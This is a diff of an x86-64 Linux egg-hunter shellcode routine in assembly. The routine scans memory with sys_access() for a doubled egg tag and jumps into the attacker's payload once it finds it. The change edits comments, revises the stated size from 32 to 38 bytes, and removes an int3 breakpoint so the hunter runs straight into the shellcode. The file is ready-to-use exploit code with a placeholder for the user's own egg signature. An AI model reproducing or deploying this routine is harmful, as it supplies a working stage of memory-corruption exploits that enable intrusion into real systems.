@@ -27,11 +27,11 @@
 ;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 ;  POSSIBILITY OF SUCH DAMAGE.
 ;
-; Linux x86-64 Egghunter using sys_access()
+; Linux x86-64 egg hunter using sys_access()
 ;
-; 32 bytes 
+; 38 bytes
 ;
-    bits   64
+    bits    64
       
     xor     edi, edi  ; rdi = 0
     mul     edi       ; rax = 0, rdx = 0
@@ -40,25 +40,23 @@
 nxt_page:
     add     rdi, rdx  ; advance 4096 bytes
 nxt_addr:
-    push    rdi
-    add     rdi, 8
+    push    rdi       ; save page address
+    add     rdi, 8    ; try read 8 bytes ahead
     push    21
     pop     rax       ; rax = sys_access 
     syscall
     pop     rdi       ; restore rdi
     cmp     al, 0xF2  ; -EFAULT means bad address
-    je      nxt_page  ; eax is zero if page is ok 
+    je      nxt_page  ; keep going until good read
     
     ; put your own egg signature here
     mov     eax, 0xDEADC0DE
     scasd
     jne     nxt_addr
 
-    int3
-    
     scasd
     jne     nxt_addr
     
-    jmp     rdi    
+    jmp     rdi       ; jump into shellcode
     
     
